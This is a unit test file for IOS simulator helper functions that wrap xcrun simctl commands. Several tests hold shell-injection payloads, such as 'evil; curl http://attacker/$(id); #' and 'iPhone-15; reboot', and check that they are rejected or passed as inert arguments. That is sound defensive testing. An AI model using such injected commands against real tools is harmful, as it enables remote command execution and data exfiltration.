/*
 * Copyright (c) 2021, salesforce.com, inc.
 * All rights reserved.
 * SPDX-License-Identifier: MIT
 * For full license text, see the LICENSE file in the repo root or https://opensource.org/licenses/MIT
 */
import { TestContext } from '@salesforce/core/testSetup';
import { stubMethod } from '@salesforce/ts-sinon';
import { expect } from 'chai';
import { CommonUtils } from '../../../src/common/CommonUtils.js';
import { IOSUtils } from '../../../src/common/IOSUtils.js';
import { PreviewUtils } from '../../../src/common/PreviewUtils.js';

describe('IOS utils tests', () => {
    const $$ = new TestContext();
    const XCRUN = '/usr/bin/xcrun';
    const DEVICE_TYPE_PREFIX = 'com.apple.CoreSimulator.SimDeviceType';
    const RUNTIME_TYPE_PREFIX = 'com.apple.CoreSimulator.SimRuntime';

    afterEach(() => {
        $$.restore();
    });

    it('Should attempt to invoke the xcrun for booting a device', async () => {
        const stub = stubMethod($$.SANDBOX, CommonUtils, 'spawnCommandAsync').resolves({
            stderr: 'mockError',
            stdout: 'Done'
        });
        const udid = 'MOCKUDID';
        await IOSUtils.bootDevice(udid);
        expect(stub.firstCall.args[0]).to.equal(XCRUN);
        expect(stub.firstCall.args[1]).to.deep.equal(['simctl', 'boot', udid]);
    });

    it('Should attempt to invoke the xcrun but fail booting a device', async () => {
        stubMethod($$.SANDBOX, CommonUtils, 'spawnCommandAsync').rejects(new Error('Mock Error'));
        return IOSUtils.bootDevice('MOCKUDID').catch((error) => expect(error).to.be.an('error'));
    });

    it('Should attempt to create a new device', async () => {
        const stub = stubMethod($$.SANDBOX, CommonUtils, 'spawnCommandAsync').resolves({
            stderr: 'mockError',
            stdout: 'Done'
        });
        const simName = 'MOCKSIM';
        const deviceType = 'MOCK-DEVICE';
        const runtimeType = 'MOCK-SIM';
        await IOSUtils.createNewDevice(simName, deviceType, runtimeType);
        expect(stub.firstCall.args[0]).to.equal(XCRUN);
        expect(stub.firstCall.args[1]).to.deep.equal([
            'simctl',
            'create',
            simName,
            `${DEVICE_TYPE_PREFIX}.${deviceType}`,
            `${RUNTIME_TYPE_PREFIX}.${runtimeType}`
        ]);
    });

    it('createNewDevice rejects a simulator name containing shell metacharacters', async () => {
        const stub = stubMethod($$.SANDBOX, CommonUtils, 'spawnCommandAsync').resolves({
            stderr: '',
            stdout: 'UDID'
        });
        const malicious = 'evil; curl http://attacker/$(id); #';

        let caught: unknown;
        try {
            await IOSUtils.createNewDevice(malicious, 'iPhone-15', 'iOS-17');
        } catch (error) {
            caught = error;
        }

        expect(caught).to.be.an('error');
        expect((caught as Error).message).to.match(/only letters, numbers, spaces, and \. _ - are allowed/i);
        // Must fail fast: the command is never built or spawned.
        expect(stub.called).to.be.false;
    });

    it('createNewDevice rejects a device type containing shell metacharacters', async () => {
        const stub = stubMethod($$.SANDBOX, CommonUtils, 'spawnCommandAsync').resolves({
            stderr: '',
            stdout: 'UDID'
        });

        let caught: unknown;
        try {
            await IOSUtils.createNewDevice('MySim', 'iPhone-15; reboot', 'iOS-17');
        } catch (error) {
            caught = error;
        }

        expect(caught).to.be.an('error');
        expect((caught as Error).message).to.match(/only letters, numbers, and \. _ - are allowed \(no spaces\)/i);
        expect(stub.called).to.be.false;
    });

    it('Should attempt to invoke xcrun to boot device but resolve if device is already booted', async () => {
        stubMethod($$.SANDBOX, CommonUtils, 'spawnCommandAsync').rejects(new Error('Failed to boot - state: booted'));
        try {
            await IOSUtils.bootDevice('MOCKUDID');
        } catch (error: any) {
            throw new Error(`Should have passed: ${error}`);
        }
    });

    it('Should wait for the device to boot', async () => {
        stubMethod($$.SANDBOX, CommonUtils, 'spawnCommandAsync').resolves({
            stderr: 'mockError',
            stdout: 'Done'
        });
        try {
            await IOSUtils.waitUntilDeviceIsReady('MOCKUDID');
        } catch (error: any) {
            throw new Error(`Should have passed: ${error}`);
        }
    });

    it('Should wait for the device to boot and fail if error is encountered', async () => {
        stubMethod($$.SANDBOX, CommonUtils, 'spawnCommandAsync').rejects(new Error('Mock Error'));
        try {
            await IOSUtils.waitUntilDeviceIsReady('MOCKUDID');
        } catch (error) {
            return;
        }

        throw new Error('Should have thrown');
    });

    it('Should launch the simulator app', async () => {
        const stub = stubMethod($$.SANDBOX, CommonUtils, 'executeCommandAsync').resolves({
            stderr: 'mockError',
            stdout: 'Done'
        });
        await IOSUtils.launchSimulatorApp();
        expect(stub.calledWith('open -a Simulator')).to.be.true;
    });

    it('Should reject if launch of simulator app fails', async () => {
        stubMethod($$.SANDBOX, CommonUtils, 'executeCommandAsync').rejects(new Error('Mock Error'));
        try {
            await IOSUtils.launchSimulatorApp();
        } catch (error) {
            return;
        }

        throw new Error('Should have thrown');
    });

    it('Should attempt to launch url in a booted simulator and resolve.', async () => {
        const stub = stubMethod($$.SANDBOX, CommonUtils, 'spawnCommandAsync').resolves({
            stderr: 'mockError',
            stdout: 'Done'
        });
        const url = 'mock.url';
        const udid = 'MOCK-UDID';
        await IOSUtils.launchURLInBootedSimulator(udid, url);
        expect(stub.firstCall.args[0]).to.equal(XCRUN);
        expect(stub.firstCall.args[1]).to.deep.equal(['simctl', 'openurl', udid, url]);
    });

    it('launchURLInBootedSimulator passes a malicious url as a single inert argv element', async () => {
        const stub = stubMethod($$.SANDBOX, CommonUtils, 'spawnCommandAsync').resolves({
            stderr: '',
            stdout: 'Done'
        });
        const udid = 'MOCK-UDID';
        const malicious = 'https://x/; curl http://attacker/$(id); #';
        await IOSUtils.launchURLInBootedSimulator(udid, malicious);
        expect(stub.firstCall.args[1]).to.include(malicious);
    });

    it('Should attempt to launch url in a booted simulator and reject if error is encountered.', async () => {
        stubMethod($$.SANDBOX, CommonUtils, 'spawnCommandAsync').rejects(new Error('Mock Error'));
        try {
            const url = 'mock.url';
            const udid = 'MOCK-UDID';
            await IOSUtils.launchURLInBootedSimulator(udid, url);
        } catch (error) {
            return;
        }

        throw new Error('Should have thrown');
    });

    it('Should attempt to launch native app in a booted simulator and resolve.', async () => {
        const stub = stubMethod($$.SANDBOX, CommonUtils, 'spawnCommandAsync').resolves({
            stderr: 'mockError',
            stdout: 'Done'
        });

        const udid = 'MOCK-UDID';
        const compName = 'mock.compName';
        const projectDir = '/mock/path';
        const targetApp = 'com.mock.app';
        const targetAppArgs = [
            { name: PreviewUtils.COMPONENT_NAME_ARG_PREFIX, value: compName },
            { name: PreviewUtils.PROJECT_DIR_ARG_PREFIX, value: projectDir },
            { name: 'arg1', value: 'val1' },
            { name: 'arg2', value: 'val2' }
        ];
        const expectedLaunchArgs = [
            `${PreviewUtils.COMPONENT_NAME_ARG_PREFIX}=${compName}`,
            `${PreviewUtils.PROJECT_DIR_ARG_PREFIX}=${projectDir}`,
            'arg1=val1',
            'arg2=val2'
        ];

        await IOSUtils.launchAppInBootedSimulator(udid, targetApp, undefined, targetAppArgs);

        expect(stub.calledTwice).to.be.true;

        expect(stub.firstCall.args[1]).to.deep.equal(['simctl', 'terminate', udid, targetApp]);

        expect(stub.secondCall.args[1]).to.deep.equal(['simctl', 'launch', udid, targetApp, ...expectedLaunchArgs]);
    });

    it('Should attempt to launch native app in a booted simulator and reject if error is encountered.', async () => {
        // First (terminate) call is swallowed; the launch call must reject.
        const stub = stubMethod($$.SANDBOX, CommonUtils, 'spawnCommandAsync');
        stub.onFirstCall().rejects(new Error('terminate error'));
        stub.onSecondCall().rejects(new Error('Mock Error'));

        const udid = 'MOCK-UDID';
        const targetApp = 'com.mock.app';
        const targetAppArgs = [
            { name: 'arg1', value: 'val1' },
            { name: 'arg2', value: 'val2' }
        ];

        try {
            await IOSUtils.launchAppInBootedSimulator(udid, targetApp, undefined, targetAppArgs);
        } catch (error) {
            return;
        }

        throw new Error('Should have thrown');
    });

    it('Should attempt to install native app then launch it.', async () => {
        const stub = stubMethod($$.SANDBOX, CommonUtils, 'spawnCommandAsync').resolves({
            stderr: 'mockError',
            stdout: 'Done'
        });

        const udid = 'MOCK-UDID';
        const compName = 'mock.compName';
        const projectDir = '/mock/path';
        const appBundlePath = '/mock/path/MyTestApp.app';
        const targetApp = 'com.mock.app';
        const targetAppArgs = [
            { name: PreviewUtils.COMPONENT_NAME_ARG_PREFIX, value: compName },
            { name: PreviewUtils.PROJECT_DIR_ARG_PREFIX, value: projectDir },
            { name: 'arg1', value: 'val1' },
            { name: 'arg2', value: 'val2' }
        ];
        const expectedLaunchArgs = [
            `${PreviewUtils.COMPONENT_NAME_ARG_PREFIX}=${compName}`,
            `${PreviewUtils.PROJECT_DIR_ARG_PREFIX}=${projectDir}`,
            'arg1=val1',
            'arg2=val2'
        ];

        await IOSUtils.launchAppInBootedSimulator(udid, targetApp, appBundlePath, targetAppArgs);

        expect(stub.calledThrice).to.be.true;

        expect(stub.firstCall.args[1]).to.deep.equal(['simctl', 'install', udid, appBundlePath.trim()]);

        expect(stub.secondCall.args[1]).to.deep.equal(['simctl', 'terminate', udid, targetApp]);

        expect(stub.thirdCall.args[1]).to.deep.equal(['simctl', 'launch', udid, targetApp, ...expectedLaunchArgs]);
    });
});
